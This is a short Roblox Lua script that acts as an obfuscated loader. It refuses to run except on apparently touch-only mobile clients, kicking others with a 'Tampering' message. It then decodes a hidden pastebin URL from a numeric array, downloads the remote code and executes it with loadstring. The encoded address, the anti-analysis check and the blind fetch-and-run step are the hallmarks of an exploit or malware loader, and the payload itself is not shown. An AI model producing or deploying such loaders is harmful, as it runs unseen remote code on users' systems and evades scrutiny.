local l1l1ll1 = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")

local function checkMobile()
    local isMobile = (UIS.TouchEnabled and not UIS.KeyboardEnabled)
    if not isMobile or UIS.MouseEnabled then
        return false
    end
    return true
end

if not checkMobile() then
    l1l1ll1:Kick("Tampering")
    return
end

_G.SESSION_TOKEN = math.random(100000, 999999)
_G.Processor = math.random(1000, 9000)

local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 119, 50, 109, 115, 66, 76, 113, 51}
local _url = ""
for i = 1, #_raw do
    _url = _url .. string.char(_raw[i])
end

local s, err = pcall(function()
    loadstring(game:HttpGet(_url))()
end)

if not s then
    l1l1ll1:Kick("Tampering")
end
